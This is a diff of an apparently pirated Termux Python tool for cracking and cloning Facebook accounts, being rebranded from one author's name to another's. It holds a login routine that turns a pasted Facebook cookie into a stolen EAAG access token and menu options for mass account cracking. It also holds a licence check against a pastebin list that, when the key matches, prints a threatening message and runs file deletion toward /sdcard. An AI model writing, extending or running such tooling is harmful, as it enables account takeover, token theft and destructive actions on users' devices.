@@ -13,12 +13,10 @@ import time
 def clear():
   os.system('clear')
 # BACK
-def back():
-  login()
 
-ahsan="HASAN"
+ahsan="XTA5T"
 imt="-M4786=="
-ak="AHMED-"
+ak="HISHAM-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
   key1 = open('/data/data/com.termux/files/usr/bin/.zxr-cov', 'r').read()
@@ -34,23 +32,23 @@ def Subscraption():
     os.system('clear')
   else:
     os.system("clear")
-    print("\t \033[1;32m First Get Approvel\033[1;37m ")
+    print("\t \033[1;32m Hisham Tarhouni ➊ \033[1;37m ")
     time.sleep(1)
     os.system("clear")
     print ("")
     print(" \033[1;32m ﺔﻋﻮﻓﺪﻣ ﺓﺍﺩﻻﺍ\033[1;37m\n")
     print ("")
-    print("i am nexus..........and you?? ")
+    print("ﻲﻧﻮﻫﺮﺘﻟﺍ ﻡﺎﺸﻫ ﻩﺍﺩﺍ ﻲﻓ ﺕﺭﻮﻧ")
     print("")
-    print(" ﻪﺘﻌﺑﺍﻭ ﺩﻮﻜﻟﺍ ﺦﺴﻧﺍ")
+    print(" ﻪﺗﺯﻭ ﺩﻮﻜﻟ ﺦﺴﻧﺍ")
     print ("")
     print (" Your Key : "+ak+ahsan+key1)
     print ("")
     name = input(" ﻚﻤﺳﺍ ﺐﺘﻛﺍ : ")
     print ("")
-    input(" ﻦﻣﺩﻻﺍ ﺪﻨﻋ ﻮﻳﺪﻴﻔﻟﺍ ﻉ ﺝﺮﻔﺗ ﺩﻮﻜﻟﺍ ﺦﺴﻨﺗ ﺎﻣ ﺪﻌﺑ")
+    input("  ﺮﺠﻨﺴﻤﻟ ﻉ ﻪﺗﺯ ")
     time.sleep(0.5) 
-    os.system("xdg-open https://m.me/100060343591259")
+    os.system("xdg-open https://www.facebook.com/profile.php?id=100015381286592&mibextid=ZbWKwL")
     Subscraption()        
 Subscraption()
 
@@ -58,7 +56,7 @@ def sec():
    kye1 =  open('/data/data/com.termux/files/usr/bin/.zxr-cov','r').read() 
    sbn = requests.get("https://pastebin.com/ddGYNNLv").text  
    if kye1 in sbn:
-    print ('؟ﺍﺍﺮﺗ ﻚﺗﺎﻔﻠﻣﻭ ﻙﺭﻮﺻ ﻑﻮﺷ ﺮﻴﻃ ﺓﺍﺩﻻﺍ ﻲﺒﺗ ﺔﺒﻨﻟﺍ ﺪﻟﻮﻳ')
+    print ('؟؟ﻙﺭﻮﺻ ﻑﻮﺷﻭ ﻞﺣﺭﺍ ﻚﻴﻧ ﺎﻬﻗﺮﺘﺨﺗ ﺶﻣ ﻚﻤﻛﺯ')
     os.system("rm -rf /data/data/com.termux/files/usr/bin/.zxr-cov") 
     os.system("cd") 
     os.system("cd /sdcard") 
@@ -241,14 +239,14 @@ def setup():
    os.system("python BR3K.py")
 def banner():
 	print(f'''\t{asu}
-  _   _   ______  __   __  _    _    _____ 
- | \ | | |  ____| \ \ / / | |  | |  / ____|
- |  \| | | |__     \ V /  | |  | | | (___  
- | . ` | |  __|     > <   | |  | |  \___ \ 
- | |\  | | |____   / . \  | |__| |  ____) |
- |_| \_| |______| /_/ \_\  \____/  |_____/ 
-                                           
-          A H M E D 🔥🇱🇾 H A S A N                                  
+██╗  ██╗██╗███████╗██╗  ██╗ █████╗ ███╗   ███╗
+██║  ██║██║██╔════╝██║  ██║██╔══██╗████╗ ████║
+███████║██║███████╗███████║███████║██╔████╔██║
+██╔══██║██║╚════██║██╔══██║██╔══██║██║╚██╔╝██║
+██║  ██║██║███████║██║  ██║██║  ██║██║ ╚═╝ ██║
+╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
+
+         H i s h a m T a r h o u n i ➊                       
                            {P}  ''')   
 
 #--------------------[ BAGIAN-MASUK ]--------------#
@@ -276,7 +274,7 @@ def login_lagi334():
 		os.system('clear')
 		banner()
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}!{x}] ﺰﻴﻛﻮﻜﻟﺍ ﻒﻠﻣ ﻦﻣ ﺰﻴﻛﻮﻛ ﻞﺧﺩﺍ :{asu} ')
+		cookie=input(f'  [{h}!{x}] ﺰﻴﻛﻮﻛ ﻂﺣ :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
@@ -331,23 +329,8 @@ def menu(my_name,my_id):
 ├── {H}{sekarang}""" )
 	bo = random.choice([m,k,h,b,u,p])
 	cetak(nel(f'INPUT MENU SEADANYA'))
-	print(f'''{P}├── 01. ﺩﺮﻔﻣ ﻱﺪﻳﺍ {P} ({H}on{P})
-├── 02. ﺓﺩﺪﻌﺘﻣ ﺕﺎﻳﺪﻳﺍ{P} ({H}ﻞﻀﻓﻻﺍ{P})
-├── 03. دﺎﻳﺯ ةﺍﺩﺍ{P} ({H}on{P})
-├── 04. crack grup V1{P} ({H}on{P})
-├── 05. crack grup V2{P} ({B}on{P})
-├── 06. clone file{P} ({M}off{P})
-├── 07. clone nomor{P} ({H}on{P})
-├── 08. clone id old{P} ({H}on{P})
-├── 09. clone username ({H}on{P})
-├── 10. clone sekota ({H}on{P})
-├── 11. setting user-agent
-├── 12. informasi author script
-├── 13. informasi script
-├── 14. cek results
-├── 15. cek opsi cp
-├── 16. bot share
-├── 00. exit''')
+	print(f'''{P}├── 01. ({H}ﺓﺩﺪﻌﺘﻣ ﺕﺎﻳﺪﻳﺍ{P})
+├── 00. ﺝﻭﺮﺧ''')
 	___regiya___ridwan = input('\n├── input: ')
 	if ___regiya___ridwan in ['1']:
 		publikx()
